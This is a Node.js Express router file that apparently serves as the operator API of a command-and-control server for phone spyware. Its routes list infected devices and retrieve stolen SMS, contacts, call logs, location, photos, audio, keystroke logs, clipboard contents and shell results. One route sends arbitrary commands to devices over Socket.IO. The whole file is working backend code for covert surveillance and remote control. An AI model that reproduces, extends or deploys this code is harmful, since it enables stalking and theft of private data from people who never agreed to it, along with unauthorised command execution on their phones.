'use strict';
const express = require('express');
const { v4: uuidv4 } = require('uuid');
const db = require('../db/database');
const { authMiddleware } = require('../middleware/auth');

const router = express.Router();

// All API routes require auth
router.use(authMiddleware);

// ─── Devices ────────────────────────────────────────────────────────────────

router.get('/devices', async (req, res) => {
  try {
    const devices = await db.getDevices();
    res.json(devices);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/devices/:id', async (req, res) => {
  try {
    const device = await db.getDevice(req.params.id);
    if (!device) return res.status(404).json({ error: 'Not found' });
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.patch('/devices/:id', async (req, res) => {
  const { alias } = req.body;
  try {
    await db.updateDeviceAlias(req.params.id, alias);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── Data retrieval ──────────────────────────────────────────────────────────

// GET /api/devices/:id/data/:type?limit=100
const VALID_TYPES = [
  'sms', 'contacts', 'call_logs', 'location', 'photo', 'audio',
  'files', 'apps', 'keylog', 'notification', 'clipboard', 'shell_result',
  'device_info',
];

router.get('/devices/:id/data/:type', async (req, res) => {
  const { type } = req.params;
  if (!VALID_TYPES.includes(type)) {
    return res.status(400).json({ error: 'Invalid data type' });
  }
  const limit = Math.min(parseInt(req.query.limit) || 100, 500);
  try {
    const rows = await db.getData(req.params.id, type, limit);
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/devices/:id/data/:type/latest', async (req, res) => {
  const { type } = req.params;
  if (!VALID_TYPES.includes(type)) {
    return res.status(400).json({ error: 'Invalid data type' });
  }
  try {
    const row = await db.getLatestData(req.params.id, type);
    res.json(row || null);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── Commands ────────────────────────────────────────────────────────────────

// POST /api/devices/:id/cmd
// Body: { action, params }
// This injects a command via the global io object attached to req.app
router.post('/devices/:id/cmd', async (req, res) => {
  const { action, params = {} } = req.body;
  if (!action) return res.status(400).json({ error: 'action required' });

  const cmdId = uuidv4();
  const deviceId = req.params.id;

  try {
    await db.saveCommand(cmdId, deviceId, action, params);

    // Forward to device via Socket.IO (if online)
    const io = req.app.get('io');
    const deviceNs = io.of('/device');
    const deviceSocket = req.app.get('deviceSockets').get(deviceId);

    if (deviceSocket) {
      deviceSocket.emit('cmd', { cmdId, action, params });
      await db.updateCommand(cmdId, 'sent');
      res.json({ cmdId, status: 'sent' });
    } else {
      res.json({ cmdId, status: 'queued' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/devices/:id/commands', async (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  try {
    const cmds = await db.getCommands(req.params.id, limit);
    res.json(cmds);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
